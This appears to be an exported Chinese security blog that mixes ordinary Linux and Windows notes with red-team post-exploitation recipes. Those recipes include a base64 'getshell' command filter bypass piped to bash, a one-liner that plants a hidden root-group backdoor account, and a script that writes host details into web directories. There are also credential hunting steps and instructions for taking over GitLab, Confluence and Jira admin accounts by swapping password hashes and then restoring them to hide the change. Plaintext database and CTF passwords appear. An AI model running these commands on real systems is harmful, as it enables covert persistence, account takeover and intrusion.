查找支持正则表达式，例如 /vim$ 匹配行尾的 &quot;vim&quot;。 需要查找特殊字符需要转义，例如 /vim\\$ 匹配 &quot;vim$&quot;。 注意查找回车应当用 ，而替换为回车应当用 \\r（相当于 &lt;CR&gt;）。 其他查找模式 ?（按住 Shift + /）往上查找。 q/ 查看查找历史，选中一项后回车可以重新查找。 q? 查看向上查找历史。 SELinux安全参考 鸟哥的linux私房菜 https://blog.csdn.net/weixin_42741132/article/details/82533665 https://blog.51cto.com/u_13570193/2093299 Security Enhanced Linux SELinux 是通过 MAC【委任式存取控制 (Mandatory Access Control, MAC)】的方式来控管程序，他控制的主体是程序， 而目标则是该程序能否读取的“文件资源”。 修改文件的SELinux标签的命令：chcon ；restorecon 有待补充 &#x2F;proc（进程的状态信息）https://blog.csdn.net/juzihongle1/article/details/77184541 &#x2F;proc&#x2F;self&#x2F;cwd\t当前目录 &#x2F;proc&#x2F;pid&#x2F;cwd\t程序运行目录 &#x2F;proc&#x2F;pid&#x2F;cmdline\t程序运行指令 &#x2F;proc&#x2F;net&#x2F;arp\t读内网地址 … chattr&#x2F;lsattr 文件隐藏属性https://www.runoob.com/linux/linux-comm-lsattr.html https://www.runoob.com/linux/linux-comm-chattr.html 除了基本r, w, x权限外，在Linux传统的Ext2&#x2F;Ext3&#x2F;Ext4文件系统下，我们还可以设置其他的系统隐藏属性，其他的文件系统可能就无法完整的支持这个指令了，例如 xfs 仅支持部份参数而已。这部份可使用 chattr 来设置，而以 lsattr 来查看。 123456789101112131415161718[root@localhost SELearning]# ll test.txt-rw-r--r--. 1 root root 12 2月 28 18:05 test.txt[root@localhost SELearning]# ls -l test.txt-rw-r--r--. 1 root root 12 2月 28 18:05 test.txt[root@localhost SELearning]# lsattr test.txt---------------- test.txt[root@localhost SELearning]# chattr +i test.txt[root@localhost SELearning]# rm -f test.txtrm: 无法删除&quot;test.txt&quot;: 不允许的操作[root@localhost SELearning]# lsattr test.txt----i----------- test.txt[root@localhost SELearning]# chattr -i test.txt[root@localhost SELearning]# rm test.txtrm：是否删除普通文件 &quot;test.txt&quot;？n[root@localhost SELearning]# lstest.txt test.txt.bak[root@localhost SELearning]# lsattr test.txt---------------- test.txt 资源备份指令打包1tar -czvf src.tar.gz /var/www/html 下载1scp -P port user@ip:/dirName fileName 解包12tar -xzvf src.tar.gztar -xzvf src.tar.gz -C /home 上传1scp -P port fileName user@ip:/dirName 端口转发12345678910111213141516171819202122232425262728293031方法一(推荐):本地访问题目通过ssh进行端口转发命令：ssh -L 本地port:赛题IP:赛题port 操作机用户@操作机IP -p 操作机port实例：操作机资源为 202.10.10.123:45678 登录用户名dawd4321 密码00xx123赛题地址为：192.168.12.5:43215 本地空闲可使用端口为9999ssh -L 9999:192.168.12.5:43215 dawd4321@202.10.10.123 -p 45678 输入登录密码，登录成功10.0.100.230:4700147.106.187.217:40022dawd5069417a9557ssh -L 10001:10.0.100.230:47001 dawd506941@47.106.187.217 -p 40022在本地nc/telnet 127.0.0.1 9999即可以本地调试pwn题如果转发的是web题目，可以直接使用浏览器访问9999端口。方法二:通过操作机做跳板进行 socks5 代理进行访问本地 PC 执行命令:ssh -CqTnN -D localhost:15567(随便一个非常用端口) &#123;操作机账号&#125;@&#123;操作机地址&#125; -p &#123;操作机端口&#125; 回车后输入 操作机密码浏览器(以 firefox 为例)设置-首选项-网络设置-手动配置 代理-socks主机 127.0.0.1 端口 15567(刚才在ssh命令 中指定的非常用端口)浏览器地址栏输入 web 题的 内网地址:端口 即可访问题目系统全局代理配置方法相似，配之后无需进行浏览器代理配置即可全局访问内网题目地址 getshell危险指令绕过12345echo cGluZyB3d3cuYmFpZHUuY29t|base64 -d|bash如果bash禁用了 可以用$0如果$0是-bash 可以用 $&#123;0:1&#125;cGluZyB3d3cuYmFpZHUuY29t等于ping www.baidu.com 添加用户&#x2F;组，密码操作12345678910111213141516sudo adduser 用户名 #添加用户(有交互)sudo usermod -a -G sudo 用户名 #添加到sudo组，附带-a参数不改变用户基本组sudo gpasswd -a 用户名 docker #参数-a附加到docker组，用户的基本组保持不变sudo usermod -G 用户名 用户名 #只保留用户基本组id 用户名 #查看用户组useradd test114 添加用户（无交互）userdel test114 删除用户passwd -d test114删除密码echo test114:114514 | chpasswdecho -e &quot;114514&quot; |passwd test114# 一句话添加用户密码\t#普通账户useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guestuseradd -p &quot;$(openssl passwd -1 123456)&quot; guest\t#root账户，admin114514/Qaxnb@654!@#useradd -p `openssl passwd -1 -salt &#x27;ysxb114&#x27; Qaxnb@654\\!@#` -u 10086 -g root -G root -s /bin/bash -d /home/.admin admin114514 一句话找web目录123find / -type f -name config.js|while read f;do sh -c &quot;id;pwd;hostname;/sbin/ifconfig&quot; &gt;$(dirname $f)/test3.txt;doneecho ZmluZCAvIC10eXBlIGYgLW5hbWUgY29uZmlnLmpzfHdoaWxlIHJlYWQgZjtkbyBzaCAtYyAiaWQ7cHdkO2hvc3RuYW1lOy9zYmluL2lmY29uZmlnIiA+JChkaXJuYW1lICRmKS90ZXN0My50eHQ7ZG9uZQo= | base64 -d |sh curl如何在 Linux&#x2F;Unix 上使用带有代理用户名&#x2F;密码的 curl 命令要将 curl命令与需要用户名和密码的代理服务器一起使用，您可以使用 -x选项指定代理服务器，并使用 -U选项指定用户名和密码。 例如，要使用位于 proxy.example.com 的代理服务器以用户名 user 和密码 password 向 https://www.example.com 发送请求，您可以使用以下命令: 1curl -x proxy.example.com -U user:password https://www.example.com 这将使用位于 proxy.example.com 的代理服务器向 https://www.example.com 发送请求，并在请求中包含用户名和密码。 如果要在 http_proxy环境变量中指定代理服务器和用户名&#x2F;密码，可以使用 --proxy-user选项指定用户名和密码。 例如： 12export http_proxy=proxy.example.comcurl --proxy-user user:password https://www.example.com 这会将“http_proxy”环境变量设置为“proxy.example.com”，并在请求中包含用户名和密码。 请记住，-x和 --proxy-user选项与用于跟随重定向的 -L选项不兼容。如果您需要遵循重定向，则可以改用“–location-trusted”选项。","tags":["笔记","操作系统","Linux","运维"],"categories":["笔记","操作系统"]},{"title":"OS-Windows学习笔记","path":"/2024/01/26/windows/","content":"记录一些Windows操作系统的学习内容 powershell查找文件名 1Get-ChildItem -Path C:\\ -Recurse -Name flag*","tags":["笔记","操作系统","运维","Windows"],"categories":["笔记","操作系统"]},{"title":"项目中的渗透后利用小结","path":"/2024/01/26/项目中的渗透后利用小结/","content":"内网主机信息收集在项目中有遇到拿到shell的情况下，看到主机名是gitlab或者是什么gitserver，通常都有k8s或者docker服务，先判断是本机启动的服务还是容器里面启动的服务，然后再到对应的地方找配置文件和数据库之类的，然后可以到应用内去找有价值的东西 可以看～&#x2F;.ssh&#x2F;底下的文件，有没有id_rsa，或者是看known_hosts曾经连接过一些什么机器，再看看&#x2F;etc&#x2F;hosts有没有给其他机器添加了解析，还有各种历史记录和配置文件也值得留意 12345678910~/.ssh/~/.bash_history/etc/hostsss -tl[n]\t#加-n参数不显示服务名，纯端口号netstat -anpps -auxf / ps -ef 看进程启动命令cat /proc/pid/environ 进程启动环境变量cat /proc/pid/cmdline 进程启动命令ls -al /proc/pid/exe\t进程可执行文件符号连接ls -al /proc/pid/fd 进程打开的文件（file descriptor） K8S当你在master节点，k8s也可以像docker一样exec 12345678910kubectl get pods #查看所有正在运行的podNAME READY STATUS RESTARTS AGEnginx-56b8c64cb4-t97vb 1/1 Running 3 1dkubectl exec -it nginx-56b8c64cb4-t97vb -- /bin/bash\t#假如当前pod只有一个容器,运行以下命令即可&lt;3&gt;假如一个pod里有多个容器,用--container or -c 参数。例如:假如这里有个Pod名为my-pod,这个Pod有两个容器,分别名为main-app 和 helper-app,下面的命令将打开到main-app的shell的容器里。kubectl exec -it my-pod --container main-app -- /bin/bash 但是很多时候exec进去都不是root账户，这个时候我们需要找到实际启动容器的机器去 12345678# 先找到pod的名称kubectl get pods # 获取容器kubectl get pods xxxx-xxx-001 # 查看容器信息kubectl get pods [-n] xxxx-xxx-001 -o wide # 定位节点机器，输入-n会报错# ssh到pod所在的节点ssh k8s-node2 # ssh连接docker ps -a | grep xxxx-xxx-001 # 查看docker容器docker exec -it -u root [CONTAINER_ID] /bin/bash # exec进入容器 GitLab代码仓库，看有没有重要系统的源码打包弄出来做代审 初始密码Gitlab 14安装初始化后，默认账户名是root,密码存放在配置文件 /etc/gitlab/initial_root_password 这个文件将在首次执行reconfigure后24小时自动删除，文件内容： 12345678910[root@gitlab ~]# cat /etc/gitlab/initial_root_password # WARNING: This value is valid only in the following conditions# 1. If provided manually (either via `GITLAB_ROOT_PASSWORD` environment variable or via `gitlab_rails[&#x27;initial_root_password&#x27;]` setting in `gitlab.rb`, it was provided before database was seeded for the first time (usually, the first reconfigure run).# 2. Password hasn&#x27;t been changed manually, either via UI or via command line.## If the password shown here doesn&#x27;t work, you must reset the admin password following https://docs.gitlab.com/ee/security/reset_user_password.html#reset-your-root-password.Password: NdaWiHzufnlWDshXY+xI52q4Br0x2O+mAsTeU6V1694=# NOTE: This file will be automatically deleted in the first reconfigure run after 24 hours. 修改管理员密码默认数据库应用是PostgreSQL，数据库是gitlabhq_production，表是users，管理员默认的id是1，用户名是root 通常docker拉起的gitlab都会有gitlab-rails，gitlab-psql一系列的应用 不考虑改回密码的情况1234567891011gitlab-rails consoleuser = User.find(1)new_password = &#x27;Aa12345678!&#x27;user.password = new_passworduser.password_confirmation = new_passworduser.save!user.attributes得到Aa12345678!密文就是这个，后面能用到&quot;encrypted_password&quot;=&gt;&quot;$2a$10$n6EWnwDjlab2YXrTc5ZdGu2OkwnE25qVS/tG2nHsvPGze5iPD317G&quot; 考虑改回密码的情况设置新密码为Aa12345678!，记得先查询一次保存旧密码的密文 1234567891011gitlab-psql\\l\\c gitlabhq_productionselect id,encrypted_password,name,username,admin from users where id=1;-- 这一步是将密码更新为Aa12345678!update users set encrypted_password=&#x27;$2a$10$n6EWnwDjlab2YXrTc5ZdGu2OkwnE25qVS/tG2nHsvPGze5iPD317G&#x27; where id=1;-- 这一步是恢复旧密码的密文update users set encrypted_password=&#x27;$2a$************************************vyy&#x27; where id=1; Confluence知识库系统，可以看有没有信息泄漏之类的东西 https://www.jianshu.com/p/7cc8ea59578a 默认配置文件位置：Linux： 1/var/atlassian/application/data/confluence/confluence.cfg.xml Windows： 1C:/Atlassian/Application/Data/Confluence/confluence.cfg.xml 数据库操作 12345678910111213141516171819202122mysql -uroot -pRadBank@530show databases;use confluence;select id,user_name,active,email_address,credential from cwd_user;-- 在数据库里面查看管理员用户select u.id, u.user_name, u.active from cwd_user u join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id where g.group_name = &#x27;confluence-administrators&#x27; and d.directory_name=&#x27;Confluence Internal Directory&#x27;; -- 记得存一下原始密码-- &#123;PKCS5S2&#125;xPqJ5enH/NPJfOyO2vUiQgoF0pRLl9R+HwxWC9zG3OjOXJbapmEl0+bEz/MelyLJ-- 原始密码明文是123456-- 无&#123;PKCS5S2&#125;的，更改密码为sphereupdate cwd_user set credential=&#x27;uQieO/1CGMUIXXftw3ynrsaYLShI+GTcPS4LdUGWbIusFvHPfUzD7CZvms6yMMvA8I7FViHVEqr6Mj4pCLKAFQ==&#x27; where user_name=&#x27;XXXX&#x27;;-- 有&#123;PKCS5S2&#125;的，更改密码为123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ms9AdSR9vnOXqnNdEmRG/kxRc22qTnx3Y/nwdyaNEg5/XAANouQ+akxcQbFjJiQ4&#x27; where user_name=&#x27;XXXX&#x27;;-- 密码是&#123;PKCS5S2&#125;前缀开头的，则用下面这个sql，这个管理员密码为 Ab123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF&#x27; where id=xxxxxx; 用已知的密文进行替换 将管理员用户的密码修改为目前已知的明文密码的密文（不能直接在数据库中添加字段，否则在单个表中添加字段可能会出现问题）。 修改密码后，登陆后台，添加用户并将其加入管理员组。 最后，将管理员密码还原回去。 更改密码 登录后台——&gt;用户管理——&gt;添加用户——&gt;加管理员组——&gt;还原admin密码 参考文章：confluence后利用 Jira项目与事务跟踪工具，经常和confluence一起出现 123456789101112131415161718192021222324mysql -uroot -pRadBank@530show databases;-- Jira数据库中，用户信息都存放在表 cwd_user中-- 切换到jiar数据库-- CREDENTIAL字段是加密后的密码use jiradb;-- 看看管理员用户信息，待会会用到select id,user_name,active,email_address,credential from cwd_user;-- 记得保存原始密码，信息收集完成之后改回-- &#123;PKCS5S2&#125;dVBfve2TpngECXqQfQJJlnnfC9WwDB25vCaXlxvSy67m/Tv6NVNi29ON0PX5vvf0-- 这个密码的明文也是123456-- 无&#123;PKCS5S2&#125;的，更改密码为sphereupdate cwd_user set credential=&#x27;uQieO/1CGMUIXXftw3ynrsaYLShI+GTcPS4LdUGWbIusFvHPfUzD7CZvms6yMMvA8I7FViHVEqr6Mj4pCLKAFQ==&#x27; where user_name=&#x27;XXXX&#x27;;-- 有&#123;PKCS5S2&#125;的，更改密码为123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ms9AdSR9vnOXqnNdEmRG/kxRc22qTnx3Y/nwdyaNEg5/XAANouQ+akxcQbFjJiQ4&#x27; where user_name=&#x27;XXXX&#x27;;-- 有&#123;PKCS5S2&#125;的，更改密码为Ab123456update cwd_user set credential=&#x27;&#123;PKCS5S2&#125;ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF&#x27; where id=xxxxxx;-- 最后记得复原密码update cwd_user set credential=&#x27;初始密码&#x27; where user_name=&#x27;XXXX&#x27;;","tags":["笔记","Linux","运维","内网渗透","K8S","GitLab","Confluence","Jira"],"categories":["技术","渗透"]},{"title":"戴尔EMC服务器重装系统","path":"/2024/01/26/戴尔EMC服务器重装系统/","content":"写在前面前言手贱用apt-get autoremove把一些重要的依赖删了，导致GUI没了，并且装不回来，遂重装系统。 准备DELL EMC PowerEdge T440，U盘（容量大于镜像文件），键盘，屏幕，鼠标，操作系统镜像。 戴尔这个服务器主机自带的管理软件还是比较完善的，而且功能也还算清晰， 参考文章： 参考文章： 如何在 Dell PowerEdge 服务器上安装操作系统 戴尔服务器专业知识：在PowerEdge上安装操作系统 如何使用Rufus创建可引导的USB设备以更新戴尔服务器 U盘准备先在ubuntu官网下载需要的镜像，我下载的是20.04-server 用Rufus将下载好的镜像烧录进USB设备 工具下载地址：https://rufus.ie/zh/ 这一步就准备好U盘了 服务器部分开机出现服务器界面是按F2先把之前的分区给删了，重新配置一次RAID，网上有教程，下面给出链接参考 https://blog.csdn.net/qq_16128855/article/details/105842286 然后F11设置启动项，将刚刚插入的U盘设置为启动盘，教程链接 https://www.cnblogs.com/love-sherry/p/7216242.html 重启，按照正常安装ubuntu的流程来安装就好了","tags":["笔记","运维"],"categories":["笔记","运维"]},{"title":"friends","path":"/friends/index.html","content":"首页友链关于 Social Page - Friends施工中。。。 友链施工中。。。 友文施工中。。。"},{"title":"关于","path":"/about/index.html","content":"首页友链关于 关于本站个人博客，啥都会放上来，技术工作生活娱乐发牢骚，更新频率极度不稳定，可能会是涓涓细流，也可能是一泻千里，笑一笑就好^^_ 關於我乜人Cantonese GDUFS CyberSecurity 點搵常用ID：Fr3Nky Email：frenkyxy0246@gmail.com GitHub：https://github.com/FrenkyOHOHOH/ 做乜CTF &#x2F; Web &#x2F; Misc &#x2F; RedTeam 人生規劃Carpe diem"}]